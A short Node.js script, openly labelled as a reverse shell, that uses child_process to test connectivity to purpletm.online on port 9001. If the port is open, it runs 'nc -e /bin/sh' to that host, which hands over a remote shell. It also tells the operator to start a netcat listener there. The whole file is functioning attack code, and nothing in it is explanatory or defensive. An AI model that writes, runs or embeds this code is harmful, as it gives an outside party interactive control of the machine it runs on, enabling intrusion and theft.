const { spawn } = require('child_process');

console.log('🔧 Debug: Starting netcat reverse shell...');
console.log('🎯 Target: purpletm.online:9001');

// Test basic connectivity first
const testConnection = spawn('nc', ['-v', '-z', 'purpletm.online', '9001'], {
    stdio: ['ignore', 'pipe', 'pipe']
});

let testOutput = '';

testConnection.stdout.on('data', (data) => {
    testOutput += data.toString();
});

testConnection.stderr.on('data', (data) => {
    testOutput += data.toString();
});

testConnection.on('close', (code) => {
    console.log(`🔍 Connection test result: ${testOutput.trim()}`);
    console.log(`🔍 Test exit code: ${code}`);
    
    if (code === 0) {
        console.log('✅ Port is open, attempting reverse shell...');
        
        // Start the actual reverse shell
        const child = spawn('nc', ['-e', '/bin/sh', 'purpletm.online', '9001'], {
            detached: false, // Don't detach for debugging
            stdio: ['ignore', 'pipe', 'pipe']
        });
        
        child.stdout.on('data', (data) => {
            console.log('📤 stdout:', data.toString());
        });
        
        child.stderr.on('data', (data) => {
            console.log('📥 stderr:', data.toString());
        });
        
        child.on('spawn', () => {
            console.log(`✅ Reverse shell spawned with PID: ${child.pid}`);
        });
        
        child.on('error', (error) => {
            console.error(`❌ Spawn error: ${error.message}`);
        });
        
        child.on('close', (code, signal) => {
            console.log(`🔚 Process closed with code: ${code}, signal: ${signal}`);
        });
        
    } else {
        console.log('❌ Port test failed - listener might not be running');
        console.log('💡 Make sure you have: nc -lvp 9001 running on purpletm.online');
    }
});

testConnection.on('error', (error) => {
    console.error(`❌ Connection test error: ${error.message}`);
});